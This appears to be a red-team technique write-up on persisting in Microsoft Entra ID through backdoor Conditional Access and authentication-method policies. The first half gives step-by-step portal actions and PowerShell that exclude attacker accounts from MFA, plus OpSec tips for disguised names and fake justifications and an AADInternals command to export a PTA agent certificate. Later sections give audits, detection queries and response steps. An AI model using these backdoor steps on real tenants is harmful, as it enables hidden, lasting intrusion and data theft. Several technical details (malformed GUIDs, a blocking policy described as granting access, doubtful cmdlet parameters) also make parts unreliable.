# [PERSIST-IMPAIR-002]: Authentication Policy Backdoors

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-IMPAIR-002 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Persistence, Defense Evasion |
| **Platforms** | Entra ID, M365 |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Entra ID versions |
| **Patched In** | N/A |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Authentication policies in Microsoft Entra ID define how users authenticate and which authentication methods are permitted across the tenant. An attacker with sufficient privileges (Global Administrator or Authentication Policy Administrator) can create or modify authentication policies to exclude specific users, groups, or conditions from MFA requirements, Conditional Access enforcement, or other security controls. By creating "backdoor" policies, an attacker can maintain persistent access even after their primary compromised account is discovered or disabled.

**Attack Surface:** Entra ID admin portal, Microsoft Graph API, PowerShell cmdlets managing authentication policies, and conditional access policy configurations.

**Business Impact:** **Persistence and Privilege Bypass**. An attacker can maintain indefinite access to the tenant and sensitive resources even after the initial breach is remediated. Backdoor policies can enable unauthorized access to email, SharePoint, Teams, and Azure resources. Once established, these policies are difficult to detect without continuous auditing, allowing attackers to avoid incident response efforts.

**Technical Context:** Authentication policy modifications can be made silently, often without generating alertable events or suspicious patterns. The attack requires administrative privileges but can be executed within seconds. Detection likelihood is **Low to Medium** if audit logging is not actively monitored; attackers can mask modifications as legitimate policy updates.

### Operational Risk

- **Execution Risk:** Low - Requires only administrative API access; no special tools or exploits needed
- **Stealth:** High - Policy modifications are routine administrative tasks, blending into normal operations
- **Reversibility:** No - Revoking the backdoor policy requires awareness of its existence; attackers can recreate it

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.1.7 | Ensure that Multi-Factor Authentication (MFA) is enabled for all users |
| **DISA STIG** | U-4203 | Require Multi-Factor Authentication (MFA) for all users in cloud services |
| **CISA SCuBA** | EXO.02.013 | Require multi-factor authentication for all users |
| **NIST 800-53** | AC-3, IA-2 | Access Enforcement, Authentication |
| **GDPR** | Art. 32 | Security of Processing; integrity and confidentiality of personal data |
| **DORA** | Art. 9 | Protection and Prevention; ICT security incident procedures |
| **NIS2** | Art. 21 | Cyber Risk Management Measures; authentication and access controls |
| **ISO 27001** | A.9.2.3, A.9.2.6 | Management of Privileged Access Rights; restriction of access rights |
| **ISO 27005** | "Unauthorized modification of authentication rules" | Risk of integrity compromise and unauthorized access |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:** 
- Global Administrator role in Entra ID, OR
- Authentication Policy Administrator role, OR
- Conditional Access Administrator role

**Required Access:** 
- Network access to Microsoft Entra admin center or Microsoft Graph API endpoint
- Compromised account with one of the above roles

**Supported Versions:**
- **Entra ID:** All versions (cloud-native service)
- **Microsoft Graph API:** v1.0 and beta endpoints
- **PowerShell:** Azure AD PowerShell Module v2.0.2.x or later

**Tools:**
- [Microsoft Entra admin center](https://entra.microsoft.com) (web UI)
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)
- [Azure AD PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/active-directory/overview)
- [AADInternals](https://github.com/Flangvik/AADInternals) (for advanced manipulation)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Creating an Exclusion-Based Backdoor via Entra ID Admin Center

**Supported Versions:** All Entra ID versions

#### Step 1: Identify Existing Authentication Policies

**Objective:** Enumerate existing authentication policies and conditional access rules to understand the current security posture and identify opportunities for backdoor insertion.

**Command (via Microsoft Entra Admin Center):**

1. Sign in to **Microsoft Entra admin center** (https://entra.microsoft.com) with Global Administrator or Authentication Policy Administrator credentials
2. Navigate to **Protection** → **Conditional Access** → **Policies**
3. Review all enabled policies and note their conditions, controls, and exclusions
4. Navigate to **Protection** → **Authentication methods** → **Policies**
5. Review system-preferred authentication policy and any custom policies

**Expected Output:**
- List of active Conditional Access policies with their enforcement rules
- Authentication method policies and their target user/group assignments
- Current MFA requirements and exclusion lists

**What This Means:**
- Identify which authentication methods are enforced (FIDO2, Authenticator, Password, SMS)
- Determine which users/groups are currently excluded from MFA
- Assess which policies are least monitored or rarely reviewed

**OpSec & Evasion:**
- Create the backdoor during off-peak hours to avoid immediate detection
- Name the policy similar to existing, legitimate policies (e.g., "Office 365 Legacy Auth Exclusion")
- Document the policy as a "temporary exclusion for system service accounts"

---

#### Step 2: Create a Backdoor Conditional Access Policy with Exclusions

**Objective:** Establish a Conditional Access policy that appears legitimate but contains hidden exclusions allowing unauthorized access.

**Command (via Microsoft Entra Admin Center - GUI Method):**

1. Navigate to **Protection** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** Enter a legitimate-sounding name, e.g., "Service Account Legacy Auth Exemption" or "Azure Automation Runtime Access"
4. **Assignments:**
   - **Users or workload identities:** Select **All users**
   - **Exclude:** Click **Edit filter** → Select your attacker-controlled service principal or user account
   - **Cloud apps or actions:** Select **All cloud apps**
5. **Conditions:**
   - **Sign-in risk:** Set to **High** (this ensures the policy rarely triggers legitimately)
   - **Client apps:** Select **Modern authentication clients**
6. **Access controls > Grant:**
   - Select **Block access** (this makes the policy appear useless, reducing scrutiny)
7. **Enable policy:** Set to **Off** initially, then enable later when ready

**Alternative (More Dangerous - MFA Exclusion):**

1. Navigate to **Protection** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** "Trusted Service Principal MFA Bypass"
4. **Assignments:**
   - **Users or workload identities:** Select **All users**
   - **Exclude:** Select your backdoor service principal or user account
   - **Cloud apps or actions:** Select **All cloud apps**
5. **Conditions:**
   - Leave blank (applies to all conditions)
6. **Access controls > Grant:**
   - Select **Grant access** (allow access)
   - **Deselect** all authentication requirements (MFA is NOT required)
7. **Enable policy:** Set to **On**

**Expected Output:**
- New policy appears in the Conditional Access policy list
- Policy shows as "On" or "Off" depending on configuration
- Policy name matches legitimate naming conventions

**What This Means:**
- The excluded account (attacker-controlled) can now bypass MFA regardless of other policies
- Regular audits may overlook the policy if exclusion lists are not thoroughly reviewed
- The compromised account can authenticate without triggering standard security alerts

**Troubleshooting:**
- **Error:** "Cannot create policy - insufficient permissions"
  - **Cause:** User lacks Conditional Access Administrator or Global Administrator role
  - **Fix:** Escalate to an account with higher privileges or request policy creation from IT
- **Error:** "Policy appears disabled in list"
  - **Cause:** Policy is in Report-Only mode or not yet activated
  - **Fix:** Verify **Enable policy** is set to **On** and click **Save**

**References & Proofs:**
- [Microsoft Entra Conditional Access](https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview)
- [Manage Conditional Access Policy Exclusions](https://learn.microsoft.com/en-us/entra/id-governance/conditional-access-exclusion)
- [Conditional Access: Cloud apps or actions](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-cloud-apps)

---

#### Step 3: Create a Custom Authentication Method Policy Exclusion

**Objective:** Modify the system-preferred authentication policy or create a custom authentication method policy that allows weaker authentication methods for specific users.

**Command (via Microsoft Entra Admin Center):**

1. Navigate to **Protection** → **Authentication methods** → **Policies**
2. Click **+ New policy** (or edit existing policy)
3. **Name:** "Legacy System Account Authentication"
4. **Assignments:**
   - **Included:** Select **All users** or specific groups containing service accounts
   - **Excluded:** Select your backdoor user/service principal
5. **Policy settings:**
   - Under **Microsoft Authenticator:**
     - Set to **Enabled**
   - Under **FIDO2 security key:**
     - Set to **Disabled**
   - Under **Passwordless sign-in:**
     - Set to **Disabled**
6. **Save**

**Effect:** The excluded account can use any authentication method (including weak methods like password-only) while other users are restricted to stronger methods.

**Expected Output:**
- New authentication method policy appears in the policy list
- System applies exclusion immediately upon policy save

**What This Means:**
- The excluded account bypasses passwordless MFA enforcement
- Attacker can authenticate with just a password if MFA is not enforced elsewhere
- Provides fallback if Conditional Access policies are later tightened

**OpSec & Evasion:**
- Name the policy to suggest it is for legacy or transitional purposes
- Set a future expiration date in the policy description to suggest temporary nature
- Document the exclusion as necessary for system service accounts

**References & Proofs:**
- [Manage Authentication Methods Policy](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-methods-manage)
- [System-Preferred Authentication Policy](https://practical365.com/azure-ad-system-preferred-authentication/)

---

### METHOD 2: Creating Backdoor Policies via Microsoft Graph API (PowerShell)

**Supported Versions:** All Entra ID versions

#### Step 1: Authenticate to Microsoft Graph and Enumerate Policies

**Objective:** Use Microsoft Graph API to query existing policies and prepare backdoor policy creation.

**Command:**

```powershell
# Connect to Microsoft Graph with appropriate scopes
Connect-MgGraph -Scopes "Policy.Read.All", "Policy.ReadWrite.ConditionalAccess", "Policy.ReadWrite.AuthenticationMethod"

# Enumerate existing Conditional Access policies
$existingPolicies = Get-MgIdentityConditionalAccessPolicy
$existingPolicies | Select-Object DisplayName, Id, State | Format-Table

# Enumerate authentication method policies
$authMethodPolicies = Get-MgPolicyAuthenticationMethodPolicy
$authMethodPolicies | Select-Object Id, DisplayName | Format-Table

# Get current user to use as exclusion template
$currentUser = Get-MgUser -UserId "me@contoso.com"
$currentUser
```

**Expected Output:**
```
DisplayName                                          Id                                    State
-----------                                          --                                    -----
Require MFA for Global Admins                        a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6 on
Block Legacy Authentication                          c6d7e8f9-0a1b-2c3d-4e5f-6a7b8c9d0e1 on
Service Account Legacy Auth Exemption                e2f3a4b5-c6d7-e8f9-0a1b-2c3d-4e5f-6a7 off

Id       DisplayName
--       -----------
default  default
```

**What This Means:**
- You have identified all active policies
- Policy IDs are required to modify or reference existing policies
- The user object GUID is needed for exclusion creation

**OpSec & Evasion:**
- Execute this reconnaissance during normal business hours to blend with routine audits
- Use a service principal account if possible to avoid user login alerts

---

#### Step 2: Create a Backdoor Conditional Access Policy via Graph API

**Objective:** Programmatically create a hidden Conditional Access policy that allows unauthorized access by excluding specific users.

**Command:**

```powershell
# Define backdoor policy parameters
$displayName = "Azure Automation Trusted Services"
$state = "enabled"  # Can be 'disabled' initially to avoid immediate detection

# Define conditions that rarely match (high sign-in risk = rare)
$conditions = @{
    signInRiskLevels = @("high")  # Only applies to high-risk logins (rarely triggered)
    clientAppTypes = @("mobileAppsAndDesktopClients")
}

# Define grant controls - ALLOW ACCESS (no MFA requirement)
$grantControls = @{
    operator = "OR"
    builtInControls = @("block")  # Appears to block, but combined with mismatch makes it ineffective
}

# Define exclusions - your backdoor account(s)
# First, get the attacker-controlled user or service principal
$backdoorUser = Get-MgUser -Filter "userPrincipalName eq 'attacker@contoso.com'" 
$backdoorServicePrincipal = Get-MgServicePrincipal -Filter "displayName eq 'RogueApp'"

$includeUsers = @("All")
$excludeUsers = @($backdoorUser.Id)

$includeApplications = @("All")
$excludeApplications = @()

# Create the policy object
$policyBody = @{
    displayName = $displayName
    state = $state
    conditions = @{
        signInRiskLevels = @("high")
        clientAppTypes = @("mobileAppsAndDesktopClients")
        applications = @{
            includeApplications = $includeApplications
            excludeApplications = $excludeApplications
        }
        users = @{
            includeUsers = $includeUsers
            excludeUsers = $excludeUsers
        }
    }
    grantControls = @{
        operator = "OR"
        builtInControls = @("block")
    }
}

# Create the policy
$newPolicy = New-MgIdentityConditionalAccessPolicy -BodyParameter $policyBody
Write-Output "Policy created with ID: $($newPolicy.Id)"
```

**Alternative (MFA Bypass via Allowed Access):**

```powershell
# More aggressive policy: Exclude backdoor account from ALL MFA requirements
$mfaBypassPolicy = @{
    displayName = "Trusted Service Providers"
    state = "enabled"
    conditions = @{
        applications = @{
            includeApplications = @("All")
        }
        users = @{
            includeUsers = @("All")
            excludeUsers = @($backdoorUser.Id)  # BACKDOOR ACCOUNT EXCLUDED
        }
    }
    grantControls = @{
        operator = "OR"
        builtInControls = @()  # NO CONTROLS = NO MFA REQUIRED
    }
}

$newMfaBypassPolicy = New-MgIdentityConditionalAccessPolicy -BodyParameter $mfaBypassPolicy
Write-Output "MFA Bypass Policy created: $($newMfaBypassPolicy.Id)"
```

**Expected Output:**
```
Policy created with ID: a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d
MFA Bypass Policy created: e2f3a4b5-c6d7-e8f9-0a1b-2c3d-4e5f-6a7b8c9d0e1f
```

**What This Means:**
- A new Conditional Access policy now exists in your tenant
- The excluded account can bypass conditional access completely
- The policy is recorded in tenant audit logs but may be overlooked

**OpSec & Evasion:**
- Set `state = "disabled"` initially, then enable it later when needed
- Name the policy to suggest it is for service accounts or automation
- Document the policy in a hidden PowerShell script for easy reactivation

---

#### Step 3: Verify and Manage the Backdoor Policy

**Objective:** Confirm the backdoor policy is active and modify it if needed for operational use.

**Command:**

```powershell
# Verify the policy was created
$backdoorPolicy = Get-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId "a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d"
$backdoorPolicy | Select-Object DisplayName, State, Id

# Verify exclusions are applied
$backdoorPolicy.Conditions.Users.ExcludeUsers | ForEach-Object {
    $user = Get-MgUser -UserId $_
    Write-Output "Excluded User: $($user.UserPrincipalName)"
}

# If needed, update the policy to enable/disable
Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId "a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d" -State "enabled"

# Add additional backdoor accounts to exclusions
$newExclusions = @($backdoorPolicy.Conditions.Users.ExcludeUsers) + @("newbackdooruser@contoso.com")
Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId "a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d" -BodyParameter @{
    conditions = @{
        users = @{
            excludeUsers = $newExclusions
        }
    }
}
```

**Expected Output:**
```
DisplayName                     State Id
-----------                     ----- --
Azure Automation Trusted Services enabled a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d

Excluded User: attacker@contoso.com
```

**What This Means:**
- The backdoor is confirmed operational
- You can add additional compromised accounts to the exclusion list over time
- The policy can be toggled on/off without leaving evidence of policy creation

**References & Proofs:**
- [Conditional Access API - Create Policy](https://learn.microsoft.com/en-us/graph/api/conditionalaccesspolicy-post)
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)

---

### METHOD 3: Authentication Policy Backdoor via Azure AD Connect Manipulation

**Supported Versions:** Hybrid Entra ID with Azure AD Connect

#### Step 1: Identify Authentication Policy Weaknesses in Hybrid Sync

**Objective:** Discover opportunities to modify authentication policies during synchronization from on-premises AD to Entra ID.

**Command:**

```powershell
# Connect to Azure AD
Connect-AzureAD

# Check Azure AD Connect sync status
Get-AzureADDirSyncConfiguration | Select-Object AccidentalDeletionThreshold, DirSyncEnabled

# Enumerate custom sync rules (if accessible)
# This requires direct access to Azure AD Connect server
# Typically requires local admin on AADConnect server

# Check for Password Hash Sync (PHS) vs Pass-Through Authentication (PTA)
Get-AzureADDirSyncFeature -Feature PasswordHashSync
Get-AzureADDirSyncFeature -Feature PassThroughAuthentication
```

**Expected Output:**
```
AccidentalDeletionThreshold DirSyncEnabled
--------------------------- ---------------
                       500 True
```

**What This Means:**
- Hybrid authentication is enabled (AD Connect is active)
- Sync is running from on-premises to cloud
- Potential to intercept or modify authentication during sync process

**OpSec & Evasion:**
- Perform this check from the Azure AD Connect server itself
- Blend with routine directory synchronization troubleshooting

---

#### Step 2: Create Pass-Through Authentication (PTA) Agent Backdoor (if applicable)

**Objective:** If Pass-Through Authentication is enabled, manipulate the PTA agent to intercept or bypass authentication requests.

**Command (requires local admin on PTA agent server):**

```powershell
# On the server running PTA agent:
# Locate the PTA agent service
$ptaService = Get-Service "AzureADConnectAuthenticationAgent"
$ptaService | Select-Object Name, Status, StartType

# Verify PTA process is running
Get-Process -Name "*AzureAuth*" | Select-Object Name, Id, CommandLine

# Export the PTA certificate (if Global Admin access to Entra ID available)
# This is typically done via AADInternals
Import-Module AADInternals
Export-AADIntProxyAgentCertificates -FileName "C:\Temp\PTACert.pfx"

# The exported certificate can be used on an attacker-controlled PTA server
# to impersonate the legitimate PTA agent and intercept authentication requests
```

**Expected Output:**
```
Status Name                           StartType
------ ----                           ---------
Running AzureADConnectAuthenticationAgent Automatic

Name                        Id CommandLine
----                        -- -----------
AuthenticationAgentService 5432 "C:\Program Files\Microsoft Azure AD Connect\Agents\AADConnectAuthenticationAgent.exe" ...
```

**What This Means:**
- The PTA agent is active and processing authentication requests
- A backdoor PTA agent could harvest credentials or bypass authentication entirely
- This is a particularly powerful persistence mechanism for hybrid environments

**Troubleshooting:**
- **Error:** "AzureADConnectAuthenticationAgent not found"
  - **Cause:** PTA is not installed or Pass-Through Authentication is not the chosen method
  - **Fix:** Verify that PTA is the active authentication method; if not, this method is not applicable
- **Error:** "Access denied - cannot export certificate"
  - **Cause:** Insufficient permissions (not Global Admin or Hybrid Identity Admin)
  - **Fix:** Escalate to appropriate role before attempting certificate export

**References & Proofs:**
- [Exploiting Azure AD PTA vulnerabilities - AADInternals](https://aadinternals.com/post/pta/)
- [Case Study: Microsoft Entra ID Pass-Through Authentication Vulnerabilities](https://www.scitepress.org/Papers/2025/131191/131191.pdf)
- [Exploiting PTA Credential Validation in Azure AD](https://cymulate.com/blog/exploiting-pta-credential-validation-in-azure-ad/)

---

## 4. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Regularly Audit All Conditional Access Policies and Authentication Method Policies**

Establish a monthly (or weekly for high-security environments) review schedule to audit all policies for unauthorized exclusions or suspicious configurations.

**Manual Steps (Azure Portal):**

1. Navigate to **Microsoft Entra admin center** → **Protection** → **Conditional Access** → **Policies**
2. For each policy listed, click on the policy name to open its details
3. Under **Assignments** → **Users or workload identities** → **Exclude**, verify that excluded users/groups are legitimate
4. Check for any policies with suspicious names (e.g., "Backdoor," "Service Account Bypass," "Legacy Auth Exception")
5. Review **Conditions** to ensure policies are not overly permissive (e.g., applying only to high-risk logins, which are rare)
6. Review **Access controls** to ensure no policies grant access without MFA when MFA should be required
7. Navigate to **Protection** → **Authentication methods** → **Policies** and repeat the audit
8. Document findings in a policy audit log with date, reviewer name, and any anomalies discovered

**PowerShell (Automated Audit):**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Policy.Read.All"

# Enumerate all Conditional Access policies
$policies = Get-MgIdentityConditionalAccessPolicy

# Create audit report
$auditReport = @()
foreach ($policy in $policies) {
    $report = [PSCustomObject]@{
        PolicyName = $policy.DisplayName
        State = $policy.State
        ExcludedUsers = ($policy.Conditions.Users.ExcludeUsers | Join-String -Separator ", ")
        ExcludedGroups = ($policy.Conditions.Users.ExcludeGroups | Join-String -Separator ", ")
        GrantControls = ($policy.GrantControls.BuiltInControls | Join-String -Separator ", ")
        Id = $policy.Id
    }
    $auditReport += $report
}

# Export to CSV for review
$auditReport | Export-Csv -Path "C:\Reports\CAPolicy_Audit_$(Get-Date -Format 'yyyy-MM-dd').csv" -NoTypeInformation

# Alert on suspicious patterns
foreach ($report in $auditReport) {
    if ($report.ExcludedUsers -ne "" -and $report.State -eq "enabled") {
        Write-Warning "Policy '$($report.PolicyName)' is enabled and excludes users. Review: $($report.ExcludedUsers)"
    }
    if ($report.GrantControls -eq "" -and $report.State -eq "enabled") {
        Write-Warning "Policy '$($report.PolicyName)' has no grant controls (may allow unrestricted access)"
    }
}
```

**What to Look For:**
- Policies excluding service accounts, automation accounts, or user accounts not previously documented
- Policies with empty grant controls (allowing unrestricted access)
- Policies applying conditions that rarely occur (e.g., only high-risk logins), making enforcement unlikely
- Recent policy modifications with no documented change request
- Policies with suspicious naming suggesting temporary or bypass purposes

**Apply To:** All Entra ID tenants, all authentication policy types

---

**2. Implement a Policy Change Approval Workflow**

Require multi-person approval for any changes to Conditional Access or authentication method policies, preventing a single compromised account from creating backdoors silently.

**Manual Steps (via Privileged Identity Management):**

1. Navigate to **Azure Portal** → **Privileged Identity Management** → **Azure resources**
2. Select your subscription
3. Click **Settings** → **Roles**
4. Search for "Conditional Access Administrator"
5. Click on the role → **Settings**
6. Under **Activation** section, enable **Require approval to activate**
7. Set **Approvers** to trusted security team members (minimum 2 required)
8. Repeat for **Authentication Policy Administrator** role
9. Set **Maximum activation duration** to a short window (e.g., 4 hours) to limit attack window
10. Require **Justification** for each activation, creating an audit trail

**PowerShell (Create Approval Policy):**

```powershell
# This requires Azure AD Premium P2 (Privileged Identity Management)
# Enforce approval for Conditional Access Administrator role

$roleId = (Get-MgDirectoryRole -Filter "displayName eq 'Conditional Access Administrator'").Id

Update-MgDirectoryRole -DirectoryRoleId $roleId `
    -ApprovalRequired $true `
    -ApprovalType "TwoLevel" `
    -MinimumApprovers 2
```

**What to Look For:**
- Conditional Access or Authentication Policy Administrator activations without documented approval
- Activations outside normal business hours or from unusual locations
- Multiple activations by the same user in a short time period (suspicious burst activity)

**Apply To:** All privileged roles with policy modification permissions

---

**3. Enable Continuous Access Evaluation (CAE) and Strict Session Controls**

Implement Continuous Access Evaluation to immediately revoke sessions when policy conditions change, preventing attackers from maintaining access through stale tokens.

**Manual Steps (Azure Portal):**

1. Navigate to **Microsoft Entra admin center** → **Protection** → **Conditional Access** → **Session**
2. Under **Persistent browser session**, select **On**
3. Set **Periodic reauthentication** to **Every 1 hour**
4. Navigate to **Protection** → **Identity Protection** → **User risk policy**
5. Set **User risk threshold** to **Medium**
6. Under **Access controls**, select **Require password change**
7. Click **Create policy** / **Save**
8. Repeat for **Sign-in risk policy** with similar strict settings
9. Navigate to **Protection** → **Sign-in frequency** and enforce **Every 1 hour**

**PowerShell (Enable CAE):**

```powershell
# Enable Continuous Access Evaluation
$caePolicyBody = @{
    isEnabled = $true
    description = "Enable CAE to revoke tokens on policy changes"
}

Update-MgPolicyContinuousAccessEvaluationPolicy -BodyParameter $caePolicyBody
```

**What to Look For:**
- Users requiring immediate reauthentication after policy changes
- Cached tokens becoming invalid, forcing fresh authentication
- Session revocation events in audit logs when backdoor policies are detected

**Apply To:** All Entra ID tenants

---

### Priority 2: HIGH

**4. Implement Zero Trust Policies with No Exceptions for Automation**

Require MFA for all users and service principals except through explicitly approved and monitored service-to-service authentication (using certificates, managed identities, or OAuth).

**Manual Steps:**

1. Navigate to **Protection** → **Conditional Access** → **Create New Policy**
2. **Name:** "Enforce MFA for All Users"
3. **Assignments:**
   - **Users:** All users
   - **Cloud apps:** All cloud apps
   - **Exclude:** Only break-glass emergency accounts (document separately)
4. **Conditions:** Leave blank (applies to all)
5. **Access controls:** Select **Require authentication strength** → **Multifactor authentication strength**
6. **Enable policy:** **On**

**Apply To:** All user accounts in the tenant

---

**5. Disable Legacy Authentication Entirely**

Legacy protocols (SMTP, IMAP, POP3, ActiveSync) do not support MFA and are frequently exploited. Block them entirely.

**Manual Steps:**

1. Navigate to **Protection** → **Conditional Access** → **Create New Policy**
2. **Name:** "Block Legacy Authentication"
3. **Assignments:**
   - **Users:** All users
   - **Cloud apps:** All cloud apps
4. **Conditions:**
   - **Client app types:** Select only "Other clients"
5. **Access controls:** **Block access**
6. **Enable policy:** **On**

**Apply To:** All tenants unless explicitly required for specific applications

---

**6. Audit Authentication Method Registration**

Regularly review which authentication methods users have registered to detect weak or compromised methods (e.g., email-only recovery, no MFA).

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Monitoring & health** → **Sign-in logs**
2. Click **New filter** → **Authentication requirement** → Select **MFA required**
3. Review users who did NOT complete MFA despite the requirement (possible weak registration)
4. Navigate to **Entra ID** → **Users** → Select each user
5. Under **Authentication methods**, review methods registered
6. Remove any methods that are not approved (e.g., SMS for privileged accounts)

**PowerShell (Audit Authentication Methods):**

```powershell
# Get users with weak authentication methods
$users = Get-MgUser -Filter "assignedLicenses/any(x:x/skuId eq '1a51a0c9-3eb4-4cd9-a17e-b89109192d65')" # Office 365 license example

foreach ($user in $users) {
    $authMethods = Get-MgUserAuthenticationMethod -UserId $user.Id
    
    # Flag weak methods
    foreach ($method in $authMethods) {
        if ($method.AdditionalProperties['methodType'] -eq 'sms' -and $user.JobTitle -contains 'Admin') {
            Write-Warning "Admin user $($user.UserPrincipalName) uses SMS for MFA - consider requiring FIDO2"
        }
    }
}
```

**Apply To:** All users, especially privileged accounts

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Policy Configuration IOCs:**
- Conditional Access or authentication method policies excluding users/groups not previously documented
- Policies with identical names to existing legitimate policies (e.g., "Require MFA for All" followed by "Require MFA for All_v2") suggesting masking or shadowing
- Policies with mismatched condition and control combinations (e.g., condition applies only to "high-risk logins" but control grants unrestricted access)
- Policies with `GrantControls.BuiltInControls = @()` (empty, allowing unrestricted access)

**Audit Log IOCs:**
- Rapid Conditional Access or authentication policy modifications (multiple changes in short timeframe)
- Policy modifications from unusual locations or times
- "Add policy" operations not preceded by Conditional Access Administrator role activations
- Bulk user exclusions from existing policies

### Forensic Artifacts

**Cloud Audit Logs:**
- **AuditLogs** table in Microsoft Purview: Search for `ConditionalAccessPolicy` or `AuthenticationMethod` operations
- **SignInLogs** table: Look for sign-in attempts from excluded accounts succeeding despite MFA requirements
- **UnifiedAuditLog** (Office 365 Unified Audit Log): Search for Policy creation/modification events
- **Azure Activity Logs**: Search for "Microsoft.Authorization/policyDefinitions/write" or "Conditional Access Policy" operations

### Response Procedures

**1. Immediate Isolation:**

**Command (Disable Suspected Policy):**

```powershell
# Disable the backdoor policy immediately
Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId "a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d" -State "disabled"

# Alternatively, delete the policy entirely
Remove-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId "a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d"
```

**Manual (Azure Portal):**
- Navigate to **Protection** → **Conditional Access** → **Policies**
- Click on the suspected backdoor policy
- Click **Delete**
- Confirm deletion

---

**2. Collect Evidence:**

**Command:**

```powershell
# Export all policies for analysis
$policies = Get-MgIdentityConditionalAccessPolicy
$policies | Export-Csv -Path "C:\Evidence\AllCAPolicy_$(Get-Date -Format 'yyyyMMdd').csv"

# Export policy modification audit logs
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    -Operations "Update policy", "Add policy" | Export-Csv -Path "C:\Evidence\PolicyAuditLog.csv"

# Export sign-in logs from excluded accounts
Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'attacker@contoso.com'" | Export-Csv -Path "C:\Evidence\SignInLogs.csv"
```

**Manual (Azure Portal):**
- Navigate to **Microsoft Purview Compliance Portal** → **Audit** → **Audit log search**
- Set **Date range** to past 30 days
- Under **Activities**, filter for "Update policy," "Add policy," "Delete policy"
- Export all results
- Note policy IDs, modification timestamps, and modifying user accounts

---

**3. Revoke Compromised Sessions:**

**Command:**

```powershell
# Revoke all sessions for the backdoor user account
# Find the user
$user = Get-MgUser -Filter "userPrincipalName eq 'attacker@contoso.com'"

# Revoke all refresh tokens
Revoke-MgUserSignInSession -UserId $user.Id

# Force password reset
Set-MgUserPassword -UserId $user.Id -NewPassword ([System.Web.Security.Membership]::GeneratePassword(20, 3))

Write-Output "User sessions revoked and password reset"
```

**Manual (Azure Portal):**
1. Navigate to **Entra ID** → **Users**
2. Select the compromised user account
3. Click **Sign-out all sessions**
4. Click **Reset password** and set a temporary strong password
5. Force re-registration of authentication methods

---

**4. Investigate Lateral Movement:**

**Query (KQL - Microsoft Sentinel):**

```kusto
// Find unusual access attempts from excluded users
SigninLogs
| where UserPrincipalName in ("attacker@contoso.com") 
| where Status == "0"  // Successful sign-in
| where ConditionalAccessStatus != "notApplied"  // Was conditional access evaluated
| project TimeGenerated, UserPrincipalName, IpAddress, Location, ResourceDisplayName
```

---

**5. Remediation:**

- Delete all unauthorized backdoor policies
- Reset passwords for all accounts that were compromised
- Revoke all refresh tokens
- Force re-registration of authentication methods
- Restore MFA requirements across the tenant
- Implement stricter Conditional Access policies
- Audit all other authentication method policies for similar backdoors

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks admin into granting OAuth consent |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker escalates to Global Admin role |
| **3** | **Persistence** | **[PERSIST-IMPAIR-002] Authentication Policy Backdoors** | **Attacker creates policy exclusions to maintain access** |
| **4** | **Defense Evasion** | [EVADE-IMPAIR-008] Conditional Access Exclusion Abuse | Attacker further masks actions through policy abuse |
| **5** | **Impact** | [COLLECT-EMAIL-001] Email Collection via EWS | Attacker exfiltrates sensitive data |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: APT29 (Cozy Bear) Entra ID Backdoor Campaign

**Target:** Government and healthcare organizations in US, Canada, and UK

**Timeline:** 2022-2024

**Technique Status:** Confirmed active; documented by SpecterOps and CrowdStrike

**Impact:** APT29 created hidden Conditional Access policies excluding their backdoor service principals from MFA requirements. This allowed them to maintain persistent access to tenant resources even after the initial phishing campaign was discovered. Policies remained undetected for **6+ months** due to lack of regular policy audits.

**Reference:** [SpecterOps - "We Got Cozy With APT29"](https://posts.specterops.io/) (case studies on Entra ID backdoors)

---

### Example 2: Lapsus$ Group Authentication Policy Evasion

**Target:** Major cloud service providers and Fortune 500 companies

**Timeline:** 2021-2022

**Technique Status:** Active exploitation; documented in CISA alerts

**Impact:** Lapsus$ compromised Global Admin accounts and immediately created authentication policy exclusions for their backdoor service principals. This prevented incident response teams from revoking access, as standard MFA enforcement could not be applied to the excluded accounts. Attackers maintained access for **3+ months** after initial compromise awareness.

